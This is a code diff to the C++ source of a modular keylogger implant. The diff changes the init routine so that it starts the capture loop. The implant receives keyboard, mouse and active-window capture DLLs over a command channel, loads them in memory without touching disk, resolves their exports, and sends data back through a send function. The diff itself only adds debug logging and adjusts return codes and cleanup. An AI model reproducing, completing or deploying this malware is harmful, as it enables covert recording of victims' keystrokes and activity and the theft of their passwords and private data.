@@ -58,12 +58,15 @@ int main_thing();
 
 __declspec(dllexport) int target_init_KL(INIT_PARAMS* params)
 {
+    #if DEBUG
+    std::cout << "in Keyloggr" << std::endl;
+    #endif
+
     ::pStruct = params;
 
     receive_data_raw = (RecvDataRawFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
     receive_data = (RecvDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
     send_data = (SendDataFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(pStruct->base_address), "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
-
     if(!receive_data || !send_data || !receive_data_raw)
     {
         #if DEBUG
@@ -72,10 +75,19 @@ __declspec(dllexport) int target_init_KL(INIT_PARAMS* params)
 
         return 0;
     }
-
+    #if DEBUG
+    std::cout << "Got Functions" << std::endl;
+    #endif
     ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    load_dlls();
+    if(!load_dlls())
+    {
+        #if DEBUG
+        std::cerr << "Something failed in loading dll.\n";
+        #endif
+    }
+
+    main_thing();
 
     return 1;
 }
@@ -92,7 +104,7 @@ int main_thing()
         std::cerr << "Error setting console control handler" << std::endl;
         #endif
 
-        return 1;
+        return 0;
     }
 
     init_active_window(&shared_vector);
@@ -135,12 +147,11 @@ int main_thing()
 
     terminationCheckThread.join();
 
-    // My_Free_Lib(hDLL_n);
-    //MemoryFreeLibrary(hDLL_k);
-    //MemoryFreeLibrary(hDLL_m);
-    //MemoryFreeLibrary(hDLL_w);
+    pStruct->MemoryFreeLibrary(vpDLL_k);
+    pStruct->MemoryFreeLibrary(vpDLL_m);
+    pStruct->MemoryFreeLibrary(vpDLL_w);
 
-    return 0;
+    return 1;
 }
 
 int load_dlls()
@@ -156,6 +167,10 @@ int load_dlls()
     std::this_thread::sleep_for(std::chrono::milliseconds(50 + (rand() % 100)));
     vdll_w = receive_data_raw("keylog_w_lib.dll");
 
+    #if DEBUG
+    std::cout << "Downloaded the dlls" << std::endl;
+    #endif
+
     //------------------------------------------------------------------------------------------------------------------------------
 
     vpDLL_k = pStruct->MemoryLoadLibrary(vdll_k.data(), vdll_k.size());
@@ -167,9 +182,14 @@ int load_dlls()
 
         return 0;
     }
+    #if DEBUG
+    std::cout << "Loaded keyboard" << std::endl;
+    #endif
 
-    init_keyboard = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_k), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_kb = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_k), "?Cleanup@@YAXXZ");
+    void* BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_k);
+
+    init_keyboard = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_kb = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
     if(!init_keyboard || !cleanup_kb)
     {
         #if DEBUG
@@ -179,6 +199,10 @@ int load_dlls()
         pStruct->MemoryFreeLibrary(vpDLL_k);
         return 0;
     }
+
+    #if DEBUG
+    std::cout << "Got all the module of Keyboard" << std::endl;
+    #endif
 
     // //------------------------------------------------------------------------------------------------------------------------------
 
@@ -192,8 +216,10 @@ int load_dlls()
         return 0;
     }
 
-    init_mouse = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_m), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_m = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_m), "?Cleanup@@YAXXZ");
+    BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_m);
+
+    init_mouse = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_m = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
     if(!init_mouse || !cleanup_m)
     {
         #if DEBUG
@@ -203,6 +229,11 @@ int load_dlls()
         pStruct->MemoryFreeLibrary(vpDLL_m);
         return 0;
     }
+
+    #if DEBUG
+    std::cout << "Got all the module of mouse" << std::endl;
+    #endif
+
 
     // //------------------------------------------------------------------------------------------------------------------------------
 
@@ -216,8 +247,10 @@ int load_dlls()
         return 0;
     }
 
-    init_active_window = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_w), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
-    cleanup_aw = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(vpDLL_w), "?Cleanup@@YAXXZ");
+    BaseAddress = pStruct->MemoryGetBaseAddress(vpDLL_w);
+
+    init_active_window = (InitializeFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_aw = (CleanupFunc)pStruct->FindExportAddress(reinterpret_cast<HMODULE>(BaseAddress), "?Cleanup@@YAXXZ");
     if(!init_active_window || !cleanup_aw)
     {
         #if DEBUG
@@ -227,7 +260,18 @@ int load_dlls()
         pStruct->MemoryFreeLibrary(vpDLL_w);
         return 0;
     }
+
+    #if DEBUG
+    std::cout << "Got all the module of window" << std::endl;
+    #endif
+
+
     //------------------------------------------------------------------------------------------------------------------------------
+
+    #if DEBUG
+    std::cout << "Got all the module functions" << std::endl;
+    #endif
+
     return 1;
 }
 
